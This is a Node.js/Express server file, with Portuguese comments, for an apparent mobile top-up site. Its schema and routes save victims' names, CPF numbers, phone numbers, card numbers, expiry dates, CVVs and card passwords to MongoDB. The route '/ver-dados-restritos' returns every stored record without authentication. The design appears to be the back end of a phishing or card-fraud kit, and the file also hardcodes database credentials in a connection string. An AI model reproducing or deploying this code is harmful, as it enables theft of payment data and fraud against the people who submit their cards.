const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONEXÃO COM O MONGODB (ingresso944_db_user)
const mongoURI = 'mongodb+srv://ingresso944_db_user:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority';

mongoose.connect(mongoURI)
  .then(() => console.log('✅ Conectado ao MongoDB!'))
  .catch(err => console.error('❌ Erro de conexão:', err));

// MODELO DE DADOS
const RecargaSchema = new mongoose.Schema({
    operadora: String, nome: String, cpf: String, telefone: String, 
    valor: String, cartao: String, data: String, cvv: String, senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// ROTA PARA SALVAR RECARGA
app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).json({ success: true });
    } catch (err) { 
        console.error(err);
        res.status(500).json({ success: false }); 
    }
});

// ROTA PARA BUSCAR DADOS NO PAINEL
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor rodando na porta ${PORT}`));